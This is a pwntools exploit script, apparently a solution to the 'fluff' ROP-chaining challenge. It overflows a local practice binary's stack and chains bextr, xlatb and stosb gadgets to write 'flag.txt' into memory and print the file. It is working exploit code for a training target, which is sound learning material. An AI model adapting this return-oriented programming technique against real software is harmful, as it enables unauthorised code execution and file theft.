#!/usr/bin/python3
from pwn import *

REMOTE = False
RUN = True
ip = '127.0.0.1'
port = 80
filepath = './fluff'

# Note: The exploit needs to be executed in the same directory as the binary
elf = context.binary = ELF(filepath, checksec=False)
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']

rop = ROP(elf)

if RUN is True:
    if REMOTE is True:
        p = remote(ip, port)
    else:
        p = process(filepath)
        # p = gdb.debug(filepath, gdbscript='''
        # b *pwnme+152
        # c
        # ''')
else:
    print(rop.rdi)
    exit()

padding_to_ret_addr = rop.generatePadding(0, 0x28)
useful_function_addr = p64(0x000000000400617)
buffer_addr = p64(0x0000000000601028) # Where we will write the file name
helper_function_addr = p64(0x0000000000400620)

pop_rdi_gadget = rop.rdi.address # pop rdi; ret
reset_eax_gadget = p64(0x0000000000400610) # mov eax, 0; pop rbp; ret
set_ebx_gadget = p64(0x000000000040069a) # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
stosb_rdi_al_gadget = p64(0x0000000000400639) # stosb byte ptr [rdi], al ; ret
xlatb_gadget = p64(0x0000000400628) # xlatb ; ret
bextr_gadget = p64(0x000000040062a) # pop rdx; pop rcx; add rcx, 0x3ef2; 0xbextr rbx, rcx, rdx; ret

flag_addresses = [
    ('f', 0x0000000000400552),
    ('l', 0x0000000000400242), 
    ('a', 0x0000000000400411), 
    ('g', 0x00000000004003CF), 
    ('.', 0x0000000000400400), 
    ('t', 0x00000000004003E0), 
    ('x', 0x0000000000400246), 
    ('t', 0x00000000004003E0), 
]

def set_rbx(rop, i):
    rop.raw(bextr_gadget)
    rop.raw(0xff00)  # rdx
    ebx_val = flag_addresses[i][1] - 0x3ef2
    if i > 0:
        ebx_val -= ord(flag_addresses[i-1][0]) # This prevents the need to reset eax each time. Instead, we adjust the value of ebx according to the previous eax value.
    else:
        ebx_val -= 0xb
    rop.raw(p64(ebx_val))  # rcx, we subtract 0x3ef2 to the value to match the gadget's logic

def set_al(rop, i):
    set_rbx(rop, i)
    rop.raw(xlatb_gadget)

def set_rdi(rop, value):
    rop.raw(pop_rdi_gadget)
    rop.raw(value)

def write_to_buffer(rop):
    set_rdi(rop, buffer_addr)
    for i in range(len(flag_addresses)):
        set_al(rop, i)
        rop.raw(stosb_rdi_al_gadget)

# Sequence of events
# 1. Padd to ret address
# 2. Jump to first gadget: set rdi to point to the buffer where we will write the file name
    # 3. Jump to second gadget: set ebx to point to first/next letter
    # 4. Jump to third gadget: set al to hold first/next letter using `xlatb`
    # 5. Jump to fourth gadget: write first/next letter to the buffer using `stosb`
# 6. Jump to first gadget: reset rdi to point to start of buffer
# 7. Call mid print_file helper function to print the file name

# `rop.raw` adds the bytes to the chain
rop.raw(padding_to_ret_addr)
write_to_buffer(rop)
set_rdi(rop, buffer_addr)
rop.raw(helper_function_addr)

p.sendline(rop.chain()) # `rop.chain` returns the bytes of the chain

print(p.recvall().decode())